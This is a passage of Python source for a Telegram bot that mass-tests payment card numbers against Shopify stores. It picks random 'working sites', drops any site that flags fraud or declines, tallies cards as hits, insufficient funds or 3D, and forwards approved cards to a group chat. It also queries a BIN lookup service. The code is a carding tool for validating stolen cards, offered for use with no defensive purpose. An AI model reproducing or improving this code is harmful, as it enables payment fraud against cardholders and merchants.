        if not re.match(r'^\d{13,19}\|?\d{1,2}\|?\d{2,4}\|?\d{3,4}$', card.replace(' ', '').replace(':', '|').replace('/', '|')):
            check_data['results']['ERROR'].append({
                'card': card,
                'message': 'Invalid format',
                'gateway': 'N/A',
                'brand': 'UNKNOWN',
                'type': 'UNKNOWN',
                'country': 'UNKNOWN 🇺🇳',
                'bank': 'UNKNOWN'
            })
            update_mass_check_status(user_id)
            continue
        
        # Check if we still have working sites
        if not working_sites:
            bot.send_message(user_id, "❌ All sites are not working. Mass check stopped.")
            break
            
        # Select a random working site
        site_info = random.choice(working_sites)
        
        # Check card
        try:
            result = check_shopify_cc(card, site_info)
            
            # Update the response button
            update_mass_check_status(user_id, current_response=result['message'])
            
            # Mark site as not working if response indicates issues
            response_upper = result['message'].upper()
            if any(x in response_upper for x in ['FRAUD_SUSPECTED', 'CARD_DECLINED', 'API Error', 'Exception', 'UNKNOWN']):
                # Remove the site from working sites
                working_sites[:] = [s for s in working_sites if s['url'] != site_info['url']]
                
                # Also update the main USER_SITES
                for site in USER_SITES[user_id]:
                    if site['url'] == site_info['url']:
                        site['working'] = False
                        site['last_checked'] = datetime.now().isoformat()
                
                save_data()
                
                # If no more working sites, break
                if not working_sites:
                    bot.send_message(user_id, "❌ All sites are not working. Mass check stopped.")
                    break
                    
            # Add to results
            check_data['results'][result['status']].append({
                'card': result['card'],
                'message': result['message'],
                'gateway': result['gateway'],
                'brand': result['brand'],
                'type': result['type'],
                'country': result['country'],
                'bank': result['bank']
            })
            
            # Send HIT and INSUFFICIENT cards to group immediately
            if result['status'] in ['APPROVED', 'APPROVED_OTP']:
                send_to_group(result, user_full_name, time.time() - check_data['start_time'], site_info['url'])
                
                # Also send to user with the new format
                approved_message = format_approved_response(result, user_full_name, time.time() - check_data['start_time'], site_info['url'])
                bot.send_message(
                    user_id,
                    approved_message,
                    parse_mode='HTML'
                )
        except Exception as e:
            # Handle any exception during card checking
            error_result = {
                'status': 'ERROR',
                'card': card,
                'message': f'Exception: {str(e)}',
                'gateway': 'N/A',
                'brand': 'UNKNOWN',
                'type': 'UNKNOWN',
                'country': 'UNKNOWN 🇺🇳',
                'bank': 'UNKNOWN'
            }
            check_data['results']['ERROR'].append(error_result)
        
        # Update status message periodically
        if i % 3 == 0 or i == len(cards) - 1:
            update_mass_check_status(user_id)
            
        time.sleep(1)  # Avoid rate limiting
        
    # Final update
    update_mass_check_status(user_id, finished=True)
    
    # Send final results
    results = check_data['results']
    total_checked = check_data['current_index']
    hits = len(results['APPROVED'])
    insufficient = len([r for r in results['APPROVED_OTP'] if 'INSUFFICIENT' in r['message'].upper()])
    three_d = len([r for r in results['APPROVED_OTP'] if 'INSUFFICIENT' not in r['message'].upper()])
    declined = len(results['DECLINED']) + len(results['EXPIRED']) + len(results['ERROR'])
    
    final_message = f"""
✅ <b>Mass Check Completed</b>
➖➖➖➖➖➖➖➖➖➖
├⦿ <b>Total Cards:</b> {len(cards)}
├⦿ <b>Checked:</b> {total_checked}
├⦿ <b>HITS:</b> {hits}
├⦿ <b>INSUFFICIENT:</b> {insufficient}
├⦿ <b>3D:</b> {three_d}
├⦿ <b>DECLINED:</b> {declined}
➖➖➖➖➖➖➖➖➖➖
<b>Elapsed Time:</b> {int(time.time() - check_data['start_time'])}s
    """
    
    bot.send_message(user_id, final_message, parse_mode='HTML')
    
    # Clean up
    if user_id in USER_CHECKS:
        del USER_CHECKS[user_id]
    
    try:
        os.remove(f"mass_check_{user_id}.txt")
    except:
        pass

def update_mass_check_status(user_id, finished=False, current_card=None, current_response=None):
    if user_id not in USER_CHECKS:
        return
        
    check_data = USER_CHECKS[user_id]
    cards = check_data['cards']
    results = check_data['results']
    elapsed = time.time() - check_data['start_time']
    
    # Count insufficient funds cards
    insufficient_count = len([r for r in results['APPROVED_OTP'] if 'INSUFFICIENT' in r['message'].upper()])
    three_d_count = len([r for r in results['APPROVED_OTP'] if 'INSUFFICIENT' not in r['message'].upper()])
    
    # Update buttons (one button per line)
    markup = types.InlineKeyboardMarkup()
    
    # Current card button
    current_card_text = current_card if current_card else check_data.get('current_card', 'Waiting...')
    if len(current_card_text) > 30:
        current_card_text = current_card_text[:27] + "..."
    markup.add(types.InlineKeyboardButton(f"CC: {current_card_text}", callback_data="mass_cc"))
    
    # Response button
    response_text = current_response if current_response else "Processing..."
    if len(response_text) > 30:
        response_text = response_text[:27] + "..."
    markup.add(types.InlineKeyboardButton(f"Response: {response_text}", callback_data="mass_response"))
    
    # Results buttons
    markup.add(types.InlineKeyboardButton(f"HITS: {len(results['APPROVED'])}", callback_data="mass_hits"))
    markup.add(types.InlineKeyboardButton(f"INSUFFICIENT: {insufficient_count}", callback_data="mass_insufficient"))
    markup.add(types.InlineKeyboardButton(f"3D: {three_d_count}", callback_data="mass_3d"))
    markup.add(types.InlineKeyboardButton(f"DECLINED: {len(results['DECLINED']) + len(results['EXPIRED']) + len(results['ERROR'])}", callback_data="mass_declined"))
    
    if not finished:
        markup.add(types.InlineKeyboardButton("CANCEL", callback_data="mass_stop"))
    
    status_text = f"""
🔰 <b>Mass Check {'Finished' if finished else 'Running'}</b>
➖➖➖➖➖➖➖➖➖➖
├⦿ <b>Total Cards:</b> {len(cards)}
├⦿ <b>Working Sites:</b> {len(check_data['working_sites'])}
├⦿ <b>Checked:</b> {check_data['current_index']}/{len(cards)}
├⦿ <b>Elapsed:</b> {int(elapsed)}s
➖➖➖➖➖➖➖➖➖➖
<b>Status:</b> <code>{'Finished' if finished else 'Running...'}</code>
    """
    
    try:
        bot.edit_message_text(
            chat_id=check_data['status_msg'].chat.id,
            message_id=check_data['status_msg'].message_id,
            text=status_text,
            parse_mode='HTML',
            reply_markup=markup
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('mass_'))
def handle_mass_buttons(call):
    user_id = str(call.from_user.id)
    
    if user_id not in USER_CHECKS:
        bot.answer_callback_query(call.id, "Mass check not found or finished")
        return
        
    check_data = USER_CHECKS[user_id]
    results = check_data['results']
    
    if call.data == 'mass_cc':
        bot.answer_callback_query(call.id, f"Current card: {check_data.get('current_card', 'Waiting...')}")
        
    elif call.data == 'mass_response':
        bot.answer_callback_query(call.id, "Current response")
        
    elif call.data == 'mass_hits':
        cards_text = "\n".join([f"<code>{r['card']}</code> | {r['message']}" for r in results['APPROVED']])
        if not cards_text:
            cards_text = "No hits yet"
            
        bot.answer_callback_query(call.id, "Showing hits")
        # Send in chunks if too long
        if len(cards_text) > 4000:
            chunks = [cards_text[i:i+4000] for i in range(0, len(cards_text), 4000)]
            for chunk in chunks:
                bot.send_message(call.message.chat.id, f"✅ <b>HITS ({len(results['APPROVED'])})</b>\n\n{chunk}", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, f"✅ <b>HITS ({len(results['APPROVED'])})</b>\n\n{cards_text}", parse_mode='HTML')
        
    elif call.data == 'mass_3d':
        three_d_cards = [r for r in results['APPROVED_OTP'] if 'INSUFFICIENT' not in r['message'].upper()]
        cards_text = "\n".join([f"<code>{r['card']}</code> | {r['message']}" for r in three_d_cards])
        if not cards_text:
            cards_text = "No 3D cards yet"
            
        bot.answer_callback_query(call.id, "Showing 3D cards")
        # Send in chunks if too long
        if len(cards_text) > 4000:
            chunks = [cards_text[i:i+4000] for i in range(0, len(cards_text), 4000)]
            for chunk in chunks:
                bot.send_message(call.message.chat.id, f"🔐 <b>3D CARDS ({len(three_d_cards)})</b>\n\n{chunk}", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, f"🔐 <b>3D CARDS ({len(three_d_cards)})</b>\n\n{cards_text}", parse_mode='HTML')
        
    elif call.data == 'mass_insufficient':
        insufficient_cards = [r for r in results['APPROVED_OTP'] if 'INSUFFICIENT' in r['message'].upper()]
        cards_text = "\n".join([f"<code>{r['card']}</code> | {r['message']}" for r in insufficient_cards])
        if not cards_text:
            cards_text = "No insufficient funds cards yet"
            
        bot.answer_callback_query(call.id, "Showing insufficient funds cards")
        # Send in chunks if too long
        if len(cards_text) > 4000:
            chunks = [cards_text[i:i+4000] for i in range(0, len(cards_text), 4000)]
            for chunk in chunks:
                bot.send_message(call.message.chat.id, f"💰 <b>INSUFFICIENT FUNDS ({len(insufficient_cards)})</b>\n\n{chunk}", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, f"💰 <b>INSUFFICIENT FUNDS ({len(insufficient_cards)})</b>\n\n{cards_text}", parse_mode='HTML')
        
    elif call.data == 'mass_declined':
        declined_cards = results['DECLINED'] + results['EXPIRED'] + results['ERROR']
        cards_text = "\n".join([f"<code>{r['card']}</code> | {r['message']}" for r in declined_cards])
        if not cards_text:
            cards_text = "No declined cards yet"
            
        bot.answer_callback_query(call.id, "Showing declined cards")
        # Send in chunks if too long
        if len(cards_text) > 4000:
            chunks = [cards_text[i:i+4000] for i in range(0, len(cards_text), 4000)]
            for chunk in chunks:
                bot.send_message(call.message.chat.id, f"❌ <b>DECLINED CARDS ({len(declined_cards)})</b>\n\n{chunk}", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, f"❌ <b>DECLINED CARDS ({len(declined_cards)})</b>\n\n{cards_text}", parse_mode='HTML')
        
    elif call.data == 'mass_stop':
        if user_id in USER_CHECKS:
            del USER_CHECKS[user_id]
        bot.answer_callback_query(call.id, "Mass check stopped")
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🛑 <b>Mass Check Stopped by User</b>",
            parse_mode='HTML'
        )

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

# Start the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
